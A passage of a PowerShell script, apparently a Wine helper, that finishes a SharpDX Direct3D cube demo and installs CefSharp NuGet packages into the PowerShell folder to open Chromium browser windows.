                        Height = form.ClientSize.Height,
                        SampleDescription = new SampleDescription(1, 0),
                        Usage = ResourceUsage.Default,
                        BindFlags = BindFlags.DepthStencil,
                        CpuAccessFlags = CpuAccessFlags.None,
                        OptionFlags = ResourceOptionFlags.None
                    });

                    // Create the depth buffer view
                    depthView = new DepthStencilView(device, depthBuffer);

                    // Setup targets and viewport for rendering
                    context.Rasterizer.SetViewport(new Viewport(0, 0, form.ClientSize.Width, form.ClientSize.Height, 0.0f, 1.0f));
                    context.OutputMerger.SetTargets(depthView, renderView);

                    // Setup new projection matrix with correct aspect ratio
                    proj = Matrix.PerspectiveFovLH((float)Math.PI / 4.0f, form.ClientSize.Width / (float)form.ClientSize.Height, 0.1f, 100.0f);

                    // We are done resizing
                    userResized = false;
                }

                var time = clock.ElapsedMilliseconds / 400.0f;

                var viewProj = Matrix.Multiply(view, proj);

                // Clear views
                context.ClearDepthStencilView(depthView, DepthStencilClearFlags.Depth, 1.0f, 0);
                context.ClearRenderTargetView(renderView, Color.Black);

                // Update WorldViewProj Matrix
                var worldViewProj = Matrix.RotationX(time) * Matrix.RotationY(time * 2) * Matrix.RotationZ(time * .7f) * viewProj;
                worldViewProj.Transpose();
                context.UpdateSubresource(ref worldViewProj, contantBuffer);

                // Draw the cube
                context.Draw(36, 0);

                // Present!
                swapChain.Present(0, PresentFlags.None);
            });

            // Release all resources
            signature.Dispose();
            vertexShaderByteCode.Dispose();
            vertexShader.Dispose();
            pixelShaderByteCode.Dispose();
            pixelShader.Dispose();
            vertices.Dispose();
            layout.Dispose();
            contantBuffer.Dispose();
            depthBuffer.Dispose();
            depthView.Dispose();
            renderView.Dispose();
            backBuffer.Dispose();
            context.ClearState();
            context.Flush();
            device.Dispose();
            context.Dispose();
            swapChain.Dispose();
            factory.Dispose();
        }
    }
}
'@ -IgnoreWarnings -WarningAction Continue -ReferencedAssemblies System.Runtime.Extensions,System,SharpDX,SharpDX.Direct3D11,SharpDX.D3DCompiler,SharpDX.DXGI,SharpDX.Mathematics,SharpDX.Desktop,System.Windows.Forms,System.Diagnostics.Tools,System.ComponentModel.Primitives,mscorlib,System.Drawing.Primitives,System.Threading.Thread

    $env:DXVK_HUD="fps,memory"

    [MiniCube5.Program]::new().Main()
}

function func_cef2
{
$dldir = "cef"

New-ItemProperty -Path 'HKCU:\\Software\\Wine\\AppDefaults\\pwsh.exe\\DllOverrides' -force -Name 'dwmapi' -Value 'builtin' -PropertyType 'String'

w_download_to $dldir "https://www.nuget.org/api/v2/package/CefSharp.Common/102.0.90" "CefSharp.Common_102.0.90.nupkg"

w_download_to $dldir "https://www.nuget.org/api/v2/package/CefSharp.Wpf/102.0.90" "CefSharp.Wpf_102.0.90.nupkg"

w_download_to $dldir "https://www.nuget.org/api/v2/package/CefSharp.WinForms/102.0.90" "CefSharp.WinForms_102.0.90.nupkg"

w_download_to $dldir "https://www.nuget.org/api/v2/package/cef.redist.x64/102.0.9" "cef.redist.x64_102.0.9.nupkg"





7z e $cachedir\\$dldir\\cef.redist.x64_102.0.9.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" -y


7z e $cachedir\\$dldir\\CefSharp.Common_102.0.90.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" lib/net452/*.dll -y 


7z e $cachedir\\$dldir\\CefSharp.Common_102.0.90.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" CefSharp/x64/*.dll -y 

7z e $cachedir\\$dldir\\CefSharp.Common_102.0.90.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" CefSharp/x64/*.exe -y 

7z e $cachedir\\$dldir\\CefSharp.Wpf_102.0.90.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" lib/net452/*.dll -y 


7z e $cachedir\\$dldir\\CefSharp.WinForms_102.0.90.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" lib/net452/*.dll -y 





#https://www.nuget.org/api/v2/package/CefSharp.Common/102.0.90

#https://www.nuget.org/api/v2/package/CefSharp.Wpf/102.0.90

#https://www.nuget.org/api/v2/package/CefSharp.WinForms/102.0.90


#https://www.nuget.org/api/v2/package/cef.redist.x64/102.0.9

Add-Type -Path $env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\System.ServiceModel.dll



Add-Type -Path "$env:SystemRoot\system32\WindowsPowerShell\v1.0\CefSharp.Core.dll"
Add-Type -Path "$env:SystemRoot\system32\WindowsPowerShell\v1.0\\CefSharp.WinForms.dll"
Add-Type -Path "$env:SystemRoot\system32\WindowsPowerShell\v1.0\\CefSharp.dll"

Add-Type -AssemblyName System.Windows.Forms

# WinForm Setup
$mainForm = New-Object System.Windows.Forms.Form
#$mainForm.Font = "Comic Sans MS,9"
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.BackColor = [System.Drawing.Color]::DarkSlateBlue
$mainForm.Text = "CefSharp"
$mainForm.Width = 960
$mainForm.Height = 700

[CefSharp.WinForms.ChromiumWebBrowser] $browser = New-Object CefSharp.WinForms.ChromiumWebBrowser "www.google.com"
$mainForm.Controls.Add($browser)

[void] $mainForm.ShowDialog()


if(1) {

    Add-Type -Path "$env:SystemRoot\system32\WindowsPowerShell\v1.0\\CefSharp.Wpf.dll"

    #Add-Type -AssemblyName System.Windows.Forms

    Add-Type -AssemblyName PresentationFramework

    [xml]$xaml = @'
    <Window
            xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
            xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
            xmlns:local="clr-namespace:WebBrowserTest"
            xmlns:cef="clr-namespace:CefSharp.Wpf;assembly=CefSharp.Wpf"
            Title="test" Height="480" Width="640">
        <Grid>
            <cef:ChromiumWebBrowser Address="https://www.google.co.jp" />
        </Grid>
    </Window>
'@

    $reader = New-Object System.Xml.XmlNodeReader $xaml
    $frame = [System.Windows.Markup.XamlReader]::Load($reader)

    $frame.ShowDialog()
    }
}
